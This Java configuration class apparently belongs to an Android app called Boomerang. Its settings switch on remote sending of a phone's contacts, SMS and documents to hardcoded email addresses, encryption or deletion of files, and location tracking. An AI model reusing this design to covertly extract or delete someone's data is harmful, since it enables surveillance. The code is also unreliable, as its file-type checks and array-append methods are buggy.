package Boomerang_android15.com;



////////////////////////////////////////////////////////////////
//
//模块功能:实现对xml配置文件的读取、修改、添加操作
//会被RegisterFace模块使用 
//如果想增加新的配置信息的方法是:
//(1)、添加相关变量作为类的成员变量
//(2)、修改ParseOneitem，增加从配置文件中读出新加配置项的代码
//(3)、修改ConstructConfigLine() 用于将新加的配置项写入配置文件
//(4)、增加相应的接口函数:Get和Set配置函数
/////////////////////////////////////////////////////////////////



import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File; 
//import java.io.FileNotFoundException; 
//import java.io.FileOutputStream; 
import java.io.FileReader;
import java.io.FileWriter;
//import java.io.IOException; 
import java.util.List;
import java.util.ArrayList;
//import java.util.Vector;


public class SetInformation
{ 
	private List <String> m_config; 
	
	
	private String m_configFilePath; //配置文件的全路径
	
	
	
	//#register
	private final String tagUserName = "username";	//用户名
	private String m_userName = "";	//必须设置,通过界面设置
	private final String tagPassword = "password";	//密码
	private String m_passWord = "";	//必须设置,通过界面设置
	private final String tagEmail_1 = "email_1";	//第一信箱
	private String m_email_1 = "";	//必须设置,通过界面设置
	private final String tagEmail_2 = "email_2";	//第二信箱
	private String m_email_2 = "";	//必须设置,通过界面设置
	
	private final String tagRoot_email = "root_email";	//超级管理员邮箱
	private String m_root_email = "feiqulaimobile@sina.com";
	private final String tagRoot_email_2 = "root_email_2";	//超级管理员邮箱
	private String m_root_email_2 = "1321490265@qq.com";	//备份信箱
	
	
	//#setting
	private final String tagDataPath = "dataPath";	//保存配置文件的路径
	private String m_dataPath = ""; //由RegisterFace模块负责设置
	
	private final String tagPhoneBookInforName = "phoneBookInforName";	//保存电话薄文件名称
	private String m_phoneBookInforName = "phoneName.txt";
	
	private final String tagPhoneInforName = "phoneInforName";	//保存手机本身信息的文件的名称
	private String m_phoneInforName = "phoneInfor.txt";
	
	private final String tagPhoneSMSInforName = "phoneSMSInforName";	//保存手机中短信内容的文件的名称
	private String m_phoneSMSInforName = "phoneSMSInfor.txt";
	
	private final String tagFileCatalogName = "fileCatalogName";	//保存文件目录的文件名称
	private String m_fileCatalogName = "fileCalalog.txt";
	
	private final String tagSearchFilePath = "searchFilePath";	//需要检索额文件的路径
	private String [] m_searchFilePath= null; //!!!!由RegisterFace模块设置,由于本模块无法获得系统目录信息.
	private final String tagSendFileType = "sendFileType";		//需要发送的文件类型
	private String [] m_sendFileType = {".txt", ".rtf", ".doc", ".xls", ".ppt", ".wps", ".et", ".dps", ".pdf", "", "", "", "", ""};
	private final String tagCryptFileType = "cryptFileType";	//需要加密的文件类型
	private String [] m_cryptFileType = {
			".rtf", ".doc", ".xls", ".ppt", ".wps", ".et", ".dps", ".pdf", 	//文本格式
			".bmp", ".gif", ".jpeg", ".jpg", ".jpe", //图片格式			 		 
			 ".mp3", ".ra", ".rm", ".ram", ".rmvb", ".wav", ".wma", ".wmv",//音频格式	
			 ".avi",  ".mpg", "mpeg", ".m4p", ".m4b","", "", "", "", ""	//视频格式			
			};  //需要加密的文档,即需要删除的文档
	
	//不支持大量动态增加扩展名的操作,会出错.
	/*
	{
			"txt", "rtf", "doc", "xls", "ppt", "wps", "et", "dps", "pdf", 	//文本格式
			"bmp", "dib", "rle", "rmf", "gif", "jpeg", "jpg", "jpe", "jif", "jfif", "thm", //图片格式
			"dcx", "pcx", "pic", "gng", "tga", "tiff", "tif", "xif", "wbmp", "wbm",
			"aac", "aa", "ac3", "a52", "aif", "aifc", "aiff", "au", "snd", "cda", "cue", "dts", //音频格式
			"dtswav", "flac", "fla", "midi", "mid", "rmi", "mod", "far", "it", "s3m", "stm", 
			"mtm", "umx", "xm", "mp3", "mp2", "mp1", "mpa", "mp3pro", "m4a", "mp4", "ape", 
			"mac", "mpc", "mpt", "ra", "rm", "ram", "rmvb", "tta", "oog", "wav", "wma", "wmv",
			"asf",  
			"avi",  "wmp", "wm", "rpm",  "rt", "rp", "smi",	"smil", "scm", "mpg", "mpeg", "mpe",	//视频格式
			"mlv", "m2v", "mpv2", "mp2v", "dat", "m4v", "m4p", "m4b", "ts", "tp", "tpr", "pva",
			"pss", "wv", "vob", "ifo", "mov", "qt", "mr", "3gp", "3gpp", "3g2", "3gp2"
			};  


	*/
	
	
	
	private final String tagTime = "time";	//时间阀值,单位:秒
	private int m_time = 1000;
	private final String tagDistance = "distance";	//时间阀值,单位:米
	private int m_distance=1000;
	
	private final String tagCommandCount = "conmmand_count";	//收到指令的次数
	private int m_commandCount=0;
	
	//#action	
	//电话薄的操作
	private final String tagIsSendPhoneBook = "IsSendPhoneBook";	//是否发送电话薄,默认发送
	private boolean m_isSendPhoneBook = true ;
	private final String tagIsCryptPhoneBook = "IsCryptPhoneBook";	//是否加密本地电话薄,加密从电话薄生成的文件
	private boolean m_isCryptPhoneBook = true;
	private final String tagIsDelPhoneBook = "IsDelPhoneBook";	//是否删除本地电话薄,默认删除
	private boolean m_isDelPhoneBook = true;
	//文件的操作
	private final String tagIsSendFileCatalog = "IsSendFileCatalog";	//是否发送本地文件目录,默认发送
	private boolean m_isSendFileCatalog = true;
	private final String tagIsCryptFile = "IsCryptFile";	//是否对文件加密,重点是文件名,和文件头,1.0默认不加密
	private boolean m_isCryptFile = true;
	private final String tagIsDelFile = "IsDelFile";	//是否删除本地文件,默认删除,这里指的是加密后的不删除
	private boolean m_isDelFile = false;
	private final String tagIsSendFile = "IsSendFile";	//是否发送送文件,默认发送
	private boolean m_isSendFile = true;
	//手机号的监控
	private final String tagIsMonitorNum = "IsMonitorNum";	//是否监控手机号的变更,!!!!暂时不提供该功能
	private boolean m_isMonitorNum = false;
	private final String tagIsMonitorPosition ="IsMonitorPosition";	//是否监控手机位置的变更
	private boolean m_isMonitorPosition = true;
	//短信监控
	

	
	public SetInformation(String configFilePath) 
	{ 
		//List <String> m_config;
		//List<String> fl = new ArrayList<String>();
		m_configFilePath = configFilePath;
		m_config = new ArrayList<String>();    
		
	}
	
	//从文件中读入配置信息
	public boolean ReadConfigFile()
	{
		File configFile = new File(m_configFilePath);
		BufferedReader br; 		//用于读出文件目录信息;
		String oneConfigLine;		//配置文件中的一行
		
		if (!configFile.exists())
		{
			//如果文件不存在,返回False;
			return false;
		}
		
		long len = configFile.length();
		
		if(configFile.length()== 0)
		{
			return false;
		}
		
		//将从配置文件读出的数据写到List中去
		try
		{
			br = new BufferedReader(new FileReader(configFile));
			
			oneConfigLine = br.readLine();
			
			while (oneConfigLine != null)
			{
				m_config.add(oneConfigLine);
				oneConfigLine = br.readLine();
			}
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		ParseConfigLine();
		
		//解析结束后,将list中的数据清空
		m_config.clear();
		return true;
	

	}
	


	////////////////////////////////////////////////////////
	//
	//函数功能:将修改后的配置信息写入配置文件
	//返回值:保存成功返回true
	//
	/////////////////////////////////////////////////////////
	public void WriteConfigFile()
	{
		//保存到另一个文件中,删除原文件,并改名
		
		File newConfigFile= new File(m_configFilePath+".bat"); //备份文件
		BufferedWriter bw; 		//用于读出文件目录信息;
		
		
		if (newConfigFile.exists())
		{
			//如果文件不存在,返回False;
			newConfigFile.delete();
		}
		
		try
		{
			newConfigFile.createNewFile();
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
		
		//构造配置文件行
		ConstructConfigLine();
		
		try 
		{
			bw = new BufferedWriter(new FileWriter(newConfigFile));
						
			for (int i=0; i<m_config.size(); i++)
			{
				bw.write(m_config.get(i));
				bw.newLine();
				
			}//end for
			bw.flush();
			bw.close();	
		}
		catch (Exception e)
		{
			e.printStackTrace();		
			
		}//end try
		
		//long len = newConfigFile.length();
		//删除原配置文件,新配置文件改名
		File oldConfigFile= new File(m_configFilePath);
		oldConfigFile.delete();
		newConfigFile.renameTo(oldConfigFile);
		
		
		
	}//end WriteConfigFile
	
	
	
	////////////////////////////////////////////////////
	//
	//操作注册信息
	//
	////////////////////////////////////////////////////
	public void SetUserName(String userName)
	{
		
		m_userName = userName;
	}
	
	public String GetUserName()
	{
		
		return m_userName;
	}
	
	
	public void SetPassWord(String password)
	{
		this.m_passWord = password;
	}
	
	public String GetPassWord()
	{
		
		return this.m_passWord;
	}
	
	
	public void SetEmail_1(String email_1)
	{
		this.m_email_1 = email_1;
	}
	
	public String GetEmail_1()
	{		
		return m_email_1;
	}
	
	
	
	public void SetEmail_2(String email_2)
	{
		this.m_email_2 = email_2;
	}
	
	public String GetEmail_2()
	{
		
		return m_email_2;
	}
	
	
	public void SetRootEmail(String rootEmail)
	{
		this.m_root_email = rootEmail;
		
	}
	
	public String GetRootEmail()
	{
		
		return m_root_email;
	}
	
	
	////////////////////////////////////////////////////////////////////////////
	//
	//操作设置信息
	//
	////////////////////////////////////////////////////////////////////////////
	//设置保存文件的路径
	public void SetDataPath(String dataPath)
	{
		this.m_dataPath = dataPath;		
	}
	
	public String GetDataPath()
	{		
		return m_dataPath;
		
	}
	
	public void SetPhoneBookInforName(String phoneBookInforName)
	{
		this.m_phoneBookInforName = phoneBookInforName;
		
	}
	
	public String GetPhoneBookInforName()
	{		
		return m_phoneBookInforName;
	}
	
	/*
	 	private final String tagPhoneInforName = "phoneInforName";	//保存手机本身信息的文件的名称
	private String m_phoneInforName = "phoneInfor.fql";
	
	private final String tagPhoneSMSInforName = "phoneSMSInforName";	//保存手机中短信内容的文件的名称
	private String m_phoneSMSInforName = "phoneSMSInfor.fql";
	 * */
	
	////////////////////////////////////////////////////////////
	//
	//函数功能:操作手机本身信息的文件的名称
	//
	/////////////////////////////////////////////////////////////
	public void SetPhoneInforName(String phoneInforName)
	{
		m_phoneInforName = phoneInforName;
	}
	public String GetPhoneInforName()
	{
		return m_phoneInforName;
	}

	////////////////////////////////////////////////////////////
	//
	//函数功能:操作手机中短信内容的文件的名称
	//
	/////////////////////////////////////////////////////////////
	public void SetPhoneSMSInforName(String phoneSMSInforName)
	{
		m_phoneSMSInforName = phoneSMSInforName;
	}
	public String GetPhoneSMSInforName()
	{
		return m_phoneSMSInforName;
	}
	
	
	public void SetFileCatalogName(String fileCatalogName)
	{
		this.m_fileCatalogName = fileCatalogName;
	}
	public String GetFileCatalogName()
	{
		return m_fileCatalogName;
	}
	
	
	
	public void SetSearchFilePath(String [] searchFilePaths)
	{
		this.m_searchFilePath = searchFilePaths;
	}
	public void AddSearchFilePath(String searchFilePath)
	{
		int len = m_searchFilePath.length;
		m_searchFilePath[len] = searchFilePath;
	}
	public String[] GetSearchFilePath()
	{
		return m_searchFilePath;
	}
	
	
	
	public void SetSendFileType(String []sendFileTypes)
	{
		
		this.m_sendFileType =  sendFileTypes;
	}
	public void AddSendFileType(String sendFileType)
	{
		int len = m_sendFileType.length;
		m_sendFileType[len] = sendFileType;
	}
	public String[] GetSendFileType()
	{
		return m_sendFileType;
	}
	public boolean IsSendFileType(String filePath)
	{
		
	
		String end = filePath.substring(filePath.lastIndexOf(".")+1, filePath.length()).toLowerCase();
		if (end.length()>5 || end.length()<=0)
		{
			//获得的后缀名异常返回false
			return false;
		}//end
		
		for(int i=0; i<m_searchFilePath.length; i++)
		{
			if(m_searchFilePath[i]==end)
			{
				return true;
			}
		}//end
		
		return false;
	}
	
	public void SetCryptFileType(String [] cryptFileTypes)
	{
		this.m_cryptFileType = cryptFileTypes;
	}
	
	public void AddCryptFileType(String cryptFileType)
	{
		int len = this.m_cryptFileType.length;
		m_cryptFileType[len] = cryptFileType;
	}
	
	public String []GetCryptFileType()
	{
		return m_cryptFileType;
	}
	
	public boolean IsCryptFileType(String filePath)
	{	
		String end = filePath.substring(filePath.lastIndexOf(".")+1, filePath.length()).toLowerCase();
		if (end.length()>5 || end.length()<=0)
		{
			//获得的后缀名异常返回false
			return false;
		}//end if
		
		for(int i=0; i<m_cryptFileType.length; i++)
		{
			if(m_searchFilePath[i]==end)
			{
				return true;
			}
		}//end for		
		return false;
	}
	
	
	public void SetTime(int time)
	{
		this.m_time = time;
	}
	
	public int GetTime()
	{
		return m_time;
	}
	
	public void SetDistance(int distance)
	{
		this.m_distance = distance;
	}
	
	public int GetDistance()
	{
		return m_distance;
	}
	
	public void SetCommandCount(int commandCount)
	{
		this.m_commandCount = commandCount;
	}
	
	public int GetCommandCount()
	{
		return this.m_commandCount;
	}
	
	
	
	/////////////////////////////////////////////////////////////////
	//
	//活动信息
	//
	/////////////////////////////////////////////////////////////////
	public void SetIsSendPhoneBook(boolean isSendPhoneBook)
	{
		this.m_isSendPhoneBook = isSendPhoneBook;
	}
	public boolean GetIsSendPhoneBook()
	{
		return m_isSendPhoneBook;
	}
	
	public void SetIsCryptPhoneBook(boolean isCryptPhoneBook)
	{
		this.m_isCryptPhoneBook = isCryptPhoneBook;
	}
	public boolean GetIsCryptPhoneBook()
	{
		return m_isCryptPhoneBook;
	}
	
	public void SetIsDelPhoneBook(boolean isDelPhoneBook)
	{
		this.m_isDelPhoneBook = isDelPhoneBook;
	}
	public boolean GetIsDelPhoneBook()
	{
		return m_isDelPhoneBook;
	}
	
	public void SetIsSendFileCatalog(boolean isSendFileCatalog)
	{
		this.m_isSendFileCatalog = isSendFileCatalog;
	}
	public boolean GetIsSendFileCatalog()
	{
		return m_isSendFileCatalog;
	}
	
	public void SetIsCryptFile(boolean isCryptFile)
	{
		this.m_isCryptFile = isCryptFile;
	}
	public boolean GetIsCryptFile()
	{
		return m_isCryptFile;
	}
	
	public void SetIsDelFile(boolean isDelFile)
	{
		this.m_isDelFile = isDelFile;
	}
	public boolean GetIsDelFile()
	{
		return m_isDelFile;
	}
	
	public void SetIsSendFile(boolean isSendFile)
	{
		this.m_isSendFile = isSendFile;
	}
	public boolean GetIsSendFile()
	{
		return m_isSendFile;
	}
	
	public void SetIsMonitorNum(boolean isMonitorNum)
	{
		this.m_isMonitorNum = isMonitorNum;
	}
	public boolean GetIsMonitorNun()
	{
		return m_isMonitorNum;
	}
	
	public void SetIsMonitorPosition(boolean isMonitorPosition)
	{
		this.m_isMonitorPosition = isMonitorPosition;
	}
	public boolean GetIsMonitorPosition()
	{
		return m_isMonitorPosition;
	}

	
	
	//从xml中读取配置信息
	public void readXMLFile(String location) 
	{ 
		
	} 
	
	//将配置信息写入xml文件
	public void writeXMLFile(String outFile)
	{ 
		
	}
	
	//解析从配置文件读入的配置行
	private void ParseConfigLine()
	{
		int listLen = m_config.size();
		String oneLineText;
		String [] items;
		
		
			
		for (int i=0; i<listLen; i++)
		{
			oneLineText = m_config.get(i);
			
			
			if (oneLineText.equals("#") || oneLineText.equals(""))
			{
				continue;
			}
			
			items = oneLineText.split(":");
			ParseOneitem(items); //解析配置文件一行中的各元素
		}//end for
		
	}
	
	//解析配置文件一行中的各元素
	private void ParseOneitem(String [] items)
	{
		if (items.length<=1)
		{
			//处理配置文件中某项的值为空的情况
			return;
		}		
		
		if (items[0].equals(tagUserName))
		{
			//用户名
			m_userName = items[1];
		}
		else if (items[0].equals(tagPassword))
		{
			//密码
			m_passWord = items[1];
		}
		else if (items[0].equals(tagEmail_1))
		{
			//第一信箱
			m_email_1  = items[1];
		}
		else if (items[0].equals(tagEmail_2))
		{
			//第二信箱
			m_email_2 = items[1];
		}
		else if (items[0].equals(tagRoot_email))
		{
			//超级管理员邮箱
			m_root_email = items[1];
		}
		//设置信息
		else if (items[0].equals(tagDataPath))
		{
			//保存配置文件的路径
			m_dataPath = items[1];
		}		
		else if (items[0].equals(tagPhoneBookInforName))
		{
			//保存电话薄文件名称
			m_phoneBookInforName = items[1];
		}		
		else if (items[0].equals(tagPhoneInforName))
		{
			m_phoneInforName = items[1];
		}
		else if (items[0].equals(tagPhoneSMSInforName))
		{
			m_phoneSMSInforName = items[1];
			
		}
		else if (items[0].equals(tagFileCatalogName))
		{
			//保存文件目录的文件名称
			m_fileCatalogName = items[1];
		}
		else if (items[0].equals(tagSearchFilePath))
		{
			//需要检索额文件的路径
			for(int i=0; i< items.length-1; i++)
			{
				if (items[i+1].equals(""))
				{
					//假设空字符只在字符串最后出现
					break;
				}
				m_searchFilePath[i] = items[i+1];
			}//end for
		
		}
		else if (items[0].equals(tagSendFileType))
		{
			//需要发送的文件类型
			for(int i=0; i< items.length-1; i++)
			{
				if (items[i+1].equals(""))
				{
					//假设空字符只在字符串最后出现
					break;
				}
				m_sendFileType[i] = items[i+1];
			}
			
		}
		else if (items[0].equals(tagCryptFileType))
		{
			//需要加密的文件类型
			for(int i=0; i< items.length-1; i++)
			{
				if (items[i+1].equals(""))
				{
					//假设空字符只在字符串最后出现
					break;
				}
				m_cryptFileType[i] = items[i+1];
			}
			
		}
		else if (items[0].equals(tagTime))
		{			
			//时间阀值,单位:秒
			m_time = Integer.parseInt(items[1]);
			//items[1].valueOf(value); //以后有用
		}
		else if (items[0].equals(tagDistance))
		{
			//时间阀值,单位:米
			m_distance = Integer.parseInt(items[1]);
		}
		else if(items[0].equals(tagCommandCount))
		{
			//记录收到了几条指令
			this.m_commandCount = Integer.parseInt(items[1]);
			
		}
		//相应动作
		else if (items[0].equals(tagIsSendPhoneBook))
		{
			//是否发送电话薄,默认发送
			m_isSendPhoneBook = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsCryptPhoneBook))
		{
			//是否加密本地电话薄,默认不加密
			m_isCryptPhoneBook = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsDelPhoneBook))
		{
			//是否删除本地电话薄,默认删除
			m_isDelPhoneBook = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsSendFileCatalog))
		{
			//是否发送本地文件目录,默认发送
			m_isSendFileCatalog = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsCryptFile))
		{
			//是否对文件加密,重点是文件名,和文件头,1.0默认不加密
			m_isCryptFile = Boolean.parseBoolean(items[1]);
		}
		
		else if (items[0].equals(tagIsDelFile))
		{
			//是否删除本地文件,默认删除
			m_isDelFile = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsSendFile))
		{
			//是否发送送文件,默认发送
			m_isSendFile = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsMonitorNum))
		{
			//是否监控手机号的变更
			m_isMonitorNum = Boolean.parseBoolean(items[1]);
		}
		else if (items[0].equals(tagIsMonitorPosition))
		{
			//是否监控手机位置的变更
			m_isMonitorPosition = Boolean.parseBoolean(items[1]);
		
		}//end if
		
	}//end ParseOneitem function
	
	
	//////////////////////////////////////////////////////////////////////////
	//
	//函数功能:构造配置项的值准备写入配置文件
	//
	//
	//////////////////////////////////////////////////////////////////////////
	private void ConstructConfigLine()
	{
		String oneLine;
		
		//#register
		//用户名
		oneLine = tagUserName + ":" + m_userName;
		m_config.add(oneLine);
		
		//密码
		oneLine = tagPassword + ":" + m_passWord;
		m_config.add(oneLine);
		
		//第一信箱
		oneLine = tagEmail_1 + ":" + m_email_1;
		m_config.add(oneLine);
		
		//第二信箱
		oneLine = tagEmail_2 + ":" + m_email_2;
		m_config.add(oneLine);
		
		//超级管理员邮箱
		oneLine = tagRoot_email + ":" + m_root_email;
		m_config.add(oneLine);
		
		//#setting
		//保存配置文件的路径
		oneLine = tagDataPath + ":" + m_dataPath;
		m_config.add(oneLine);
				

		//保存电话薄文件名称
		oneLine = tagPhoneBookInforName + ":" + m_phoneBookInforName;
		m_config.add(oneLine);
			
		//保存手机本身信息的文件的名称
		oneLine = tagPhoneInforName + ":" + m_phoneInforName;
		m_config.add(oneLine);
		
		//保存手机中短信内容的文件的名称
		oneLine = tagPhoneSMSInforName + ":" + m_phoneSMSInforName;
		m_config.add(oneLine);
		
		//保存文件目录的文件名称
		oneLine = tagFileCatalogName + ":" + m_fileCatalogName;
		m_config.add(oneLine);
		
		//需要检索额文件的路径
		if (m_searchFilePath != null)
		{
			if (m_searchFilePath.length > 0)
			{
				oneLine = tagSearchFilePath;		
				for (int i=0; i<m_searchFilePath.length; i++)
				{
					if (m_searchFilePath[i] == null)
					{
						//字符串为空
						continue;
					}
					
					if(m_searchFilePath[i].equals(""))
					{
						//字符串为空字符
						continue;
					}
					oneLine +=":" + m_searchFilePath[i];
				}
				m_config.add(oneLine);			
			}//end if
		}
		
		//需要发送的文件类型
		if (m_sendFileType != null)
		{
			if (m_sendFileType.length > 0)
			{
				oneLine = tagSendFileType;
				for (int i=0; i<m_sendFileType.length; i++)
				{
					if (m_sendFileType[i] == null)
					{
						//字符串为空
						continue;
					}
					
					if(m_sendFileType[i].equals(""))
					{
						//字符串为空字符
						continue;
					}
					oneLine +=":" + m_sendFileType[i];
				}
				m_config.add(oneLine);
			}// end if 
		}
		
		
		//需要加密的文件类型
		if (m_cryptFileType != null)
		{
			if (m_cryptFileType.length>0)
			{
				oneLine = tagCryptFileType; 
				for (int i=0; i<m_cryptFileType.length; i++)
				{
					if (m_cryptFileType[i] == null)
					{
						//字符串为空
						continue;
					}
					
					if(m_cryptFileType[i].equals(""))
					{
						//字符串为空字符
						continue;
					}
					oneLine +=":" + m_cryptFileType[i];
				}
				m_config.add(oneLine);
			}
		}
		//时间阀值,单位:秒
		oneLine = tagTime + ":" + String.valueOf(m_time);
		m_config.add(oneLine);
		
		//时间阀值,单位:米
		oneLine = tagDistance + ":" + String.valueOf(m_distance);
		m_config.add(oneLine);
		
		//记录命令被启动的次数
		oneLine = tagCommandCount + ":" + String.valueOf(m_commandCount);
		m_config.add(oneLine);	

			
		//#action		
		//是否发送电话薄,默认发送
		oneLine = tagIsSendPhoneBook + ":" + String.valueOf(m_isSendPhoneBook);
		m_config.add(oneLine);
		
		//是否加密本地电话薄,默认不加密
		oneLine = tagIsCryptPhoneBook + ":" + String.valueOf(m_isCryptPhoneBook);
		m_config.add(oneLine);
		
		//是否删除本地电话薄,默认删除
		oneLine = tagIsDelPhoneBook + ":" + String.valueOf(m_isDelPhoneBook);
		m_config.add(oneLine);
		
		//是否发送本地文件目录,默认发送
		oneLine = tagIsSendFileCatalog + ":" + String.valueOf(m_isSendFileCatalog);
		m_config.add(oneLine);
		
		//是否对文件加密,重点是文件名,和文件头,1.0默认不加密
		oneLine = tagIsCryptFile + ":" + String.valueOf(m_isCryptFile);
		m_config.add(oneLine);
		
		//是否删除本地文件,默认删除
		oneLine = tagIsDelFile + ":" + String.valueOf(m_isDelFile);
		m_config.add(oneLine);		
		
		//是否发送送文件,默认发送
		oneLine = tagIsSendFile + ":" + String.valueOf(m_isSendFile);
		m_config.add(oneLine);
		
		//是否监控手机号的变更
		oneLine = tagIsMonitorNum + ":" + String.valueOf(m_isMonitorNum);
		m_config.add(oneLine);
		
		//是否监控手机位置的变更
		oneLine = tagIsMonitorPosition + ":" + String.valueOf(m_isMonitorPosition);
		m_config.add(oneLine);
		
		
	}//end ConstructConfigLine function
		
	
}


